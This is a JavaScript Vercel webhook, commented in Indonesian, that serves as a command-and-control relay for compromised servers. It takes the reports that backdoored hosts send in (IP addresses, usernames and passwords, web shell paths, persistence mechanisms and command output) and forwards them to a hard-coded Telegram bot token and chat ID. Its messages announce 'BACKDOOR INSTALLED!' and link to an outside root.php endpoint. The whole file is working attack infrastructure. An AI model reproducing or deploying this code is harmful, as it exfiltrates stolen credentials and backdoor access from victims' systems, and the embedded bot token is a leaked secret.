// ================================================================
// SHS WEBHOOK FORWARDER - VERCEL (NO ENV)
// ================================================================

const axios = require('axios');

// ================================================================
// KONFIGURASI - LANGSUNG HARDCODE
// ================================================================
const TELEGRAM_BOT_TOKEN = "8566302350:AAHT2-hM1XpcwkJbZ1Z16FDb0G1VRN-hwqUE";
const TELEGRAM_CHAT_ID = "6026186114";

// ================================================================
// FUNGSI KIRIM KE TELEGRAM
// ================================================================
async function sendToTelegram(message, parseMode = 'HTML') {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: parseMode
        });
        console.log('✅ Pesan terkirim ke Telegram!');
        return response.data;
    } catch (error) {
        console.error('❌ Gagal kirim:', error.response?.data || error.message);
        return null;
    }
}

// ================================================================
// FUNGSI FORMAT PESAN
// ================================================================
function formatMessage(data) {
    const { ip, host, user, pass, type, command, output, users, cron, shell, persistence } = data;
    
    let message = '';
    
    if (type === 'backdoor' || user) {
        message += `🔥 <b>BACKDOOR INSTALLED!</b>\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
        message += `🖥️ <b>Server:</b> ${host || 'Unknown'}\n`;
        message += `📡 <b>IP:</b> <code>${ip || 'Unknown'}</code>\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
        message += `👤 <b>User:</b> <code>${user || 'Unknown'}</code>\n`;
        message += `🔑 <b>Pass:</b> <code>${pass || 'Unknown'}</code>\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
        if (users) message += `👥 <b>Total Users:</b> ${users}\n`;
        if (cron) message += `⏰ <b>Cronjobs:</b> ${cron}\n`;
        if (shell) message += `🐚 <b>Web Shell:</b> ${shell}\n`;
        if (persistence) message += `🔗 <b>Persistence:</b> ${persistence}\n`;
        message += `⏰ <b>Time:</b> ${new Date().toLocaleString('id-ID')}\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
        message += `🔗 <a href="https://godpay.biz.id/root.php?ip=${ip}">Cek di Webhook</a>`;
    } else if (type === 'ping' || (ip && !user && !command)) {
        message += `📡 <b>PING RECEIVED!</b>\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
        message += `🖥️ <b>Host:</b> ${host || 'Unknown'}\n`;
        message += `📡 <b>IP:</b> <code>${ip || 'Unknown'}</code>\n`;
        message += `📊 <b>Status:</b> Online\n`;
        message += `⏰ <b>Time:</b> ${new Date().toLocaleString('id-ID')}\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
        message += `🔗 <a href="https://godpay.biz.id/root.php?ip=${ip}">Cek di Webhook</a>`;
    } else if (command) {
        message += `⚡ <b>COMMAND EXECUTED!</b>\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
        message += `📡 <b>IP:</b> <code>${ip || 'Unknown'}</code>\n`;
        message += `📝 <b>Command:</b>\n<code>${command}</code>\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
        message += `📋 <b>Output:</b>\n<code>${output || 'No output'}</code>\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
        message += `⏰ ${new Date().toLocaleString('id-ID')}`;
    } else {
        message += `📨 <b>DATA RECEIVED</b>\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
        message += `<code>${JSON.stringify(data, null, 2)}</code>\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
        message += `⏰ ${new Date().toLocaleString('id-ID')}`;
    }
    
    if (message.length > 4096) {
        message = message.substring(0, 4000) + '\n... (truncated)';
    }
    
    return message;
}

// ================================================================
// FUNGSI KIRIM FOTO (OPSIONAL)
// ================================================================
async function sendPhotoToTelegram(photoUrl, caption = '') {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
    
    try {
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            photo: photoUrl,
            caption: caption,
            parse_mode: 'HTML'
        });
        console.log('✅ Foto terkirim!');
        return response.data;
    } catch (error) {
        console.error('❌ Gagal kirim foto:', error.message);
        return null;
    }
}

// ================================================================
// VERCEL API HANDLER
// ================================================================
module.exports = async (req, res) => {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    // Ambil data dari GET atau POST
    const data = req.method === 'GET' ? req.query : req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    console.log(`📨 Webhook received from ${clientIp}:`, data);
    
    try {
        // Format & kirim ke Telegram
        const message = formatMessage(data);
        await sendToTelegram(message);
        
        // Kalo ada foto, kirim juga
        if (data.photo) {
            await sendPhotoToTelegram(data.photo, data.photo_caption || '');
        }
        
        res.status(200).json({ 
            status: 'ok', 
            message: 'Data forwarded to Telegram',
            received: data 
        });
        
    } catch (error) {
        console.error('❌ Error:', error.message);
        res.status(500).json({ 
            status: 'error', 
            message: error.message 
        });
    }
};
